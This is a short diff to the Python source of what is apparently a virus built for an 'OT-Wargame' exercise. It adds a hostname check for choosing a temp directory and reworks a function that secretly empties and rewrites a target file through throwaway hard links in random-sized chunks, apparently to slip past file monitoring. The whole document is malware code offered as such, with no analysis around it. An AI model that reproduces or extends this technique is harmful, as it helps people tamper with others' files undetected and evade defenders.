@@ -4,6 +4,7 @@ import socket
 import marshal
 import glob
 import os
+import sys
 from random import randint
 from uuid import uuid4 as uuid
 
@@ -20,14 +21,24 @@ def to_hex(s):
 
 
 def hardlink_write(content, file):
+    if socket.gethostname() == "OT-Wargame":
+        tmp_dir = "/tmp/"
+    else:
+        tmp_dir = os.path.join(os.environ["VIRUS_HOME"], "tmp/")
+
     size = len(content)
     offset = 0
-    hardlink = "%s/tmp/%s" % (os.environ["VIRUS_HOME"], uuid())
+    
+    # we want to empty the file......
+    hardlink = "%s/%s" % (tmp_dir, uuid())
     os.link(file, hardlink)
     f = open(hardlink, 'w')
     f.close()
     os.unlink(hardlink)
+    
+    # ... then fill it
     while offset < size:
+        hardlink = "%s/%s" % (tmp_dir, uuid())
         os.link(file, hardlink)
         f = open(hardlink, 'a')
         size_chunk = randint(1, 1 + (size - offset) / 2)
